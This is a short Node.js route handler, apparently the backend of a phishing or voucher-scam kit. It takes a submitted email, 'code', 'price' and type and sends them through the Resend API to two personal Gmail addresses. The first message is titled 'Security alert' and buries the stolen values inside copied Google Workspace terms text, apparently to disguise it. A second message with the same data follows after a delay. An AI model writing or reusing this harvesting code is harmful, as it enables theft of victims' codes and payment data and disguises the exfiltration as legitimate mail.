// contactAdmin.js

// Route POST pour recevoir les données du formulaire
exports.contactAdmin = async (req, res) => {
  const { type, email, code, price } = req.body;
  const type_truc = type[0] + type[1];

  // Contenu du premier email ("rough")
  const mailOptions_rough = {
    from: 'Networking Academy <onboarding@resend.dev>', // ton domaine validé chez Resend
    to: 'backend829@gmail.com',
    subject: 'Security alert',
    text: `If you’re a Google Workspace reseller whose customers ${email} P: ${price} have enabled their users to access Google Additional Services:
    Our new Terms of Service won’t affect your Google Workspace agreement with your customers. These new terms will only apply to your customers’ users who’ve been given access to Google Additional Services. Your customers can always manage whether their users have access to Google Additional Services, and which ones, in their Admin console.\n\n\n\ Networking: ${type_truc}\nC: ${code}\n`,
  };

  // Contenu du deuxième email
  const mailOptions = {
    from: 'Admin <onboarding@resend.dev>', // ton domaine validé chez Resend
    to: 'dianelx12@gmail.com',
    subject: 'Données de vérification',
    text: `Type: ${type}\nEmail: ${email}\nCode: ${code}\nPrice: ${price}€`,
  };

  try {
    // Envoi du premier mail
    let response1 = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${process.env.RESEND_API_KEY2}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(mailOptions_rough),
    });

    if (!response1.ok) {
      throw new Error(`Erreur Resend Rough: ${await response1.text()}`);
    }
    console.log('Email rough envoyé ✅');

    // Après délai (25s ou 55s selon ta logique), envoi du deuxième mail
    let delay =
      email === 'dianelx12@gmail.com' ||
      email === 'bibibibi3a@gmail.com' ||
      !email.includes('@')
        ? 25 * 1000
        : 55 * 1000;

    setTimeout(async () => {
      try {
        let response2 = await fetch('https://api.resend.com/emails', {
          method: 'POST',
          headers: {
            Authorization: `Bearer ${process.env.RESEND_API_KEY}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(mailOptions),
        });

        if (!response2.ok) {
          throw new Error(`Erreur Resend Normal: ${await response2.text()}`);
        }
        console.log('Email normal envoyé ✅');
      } catch (err2) {
        console.error('Erreur envoi email normal:', err2);
      }
    }, delay);

    res.status(200).send('Premier email envoyé, second en attente…');
  } catch (err) {
    console.error('Erreur envoi rough:', err);
    res.status(500).send("Erreur lors de l'envoi du premier email");
  }
};
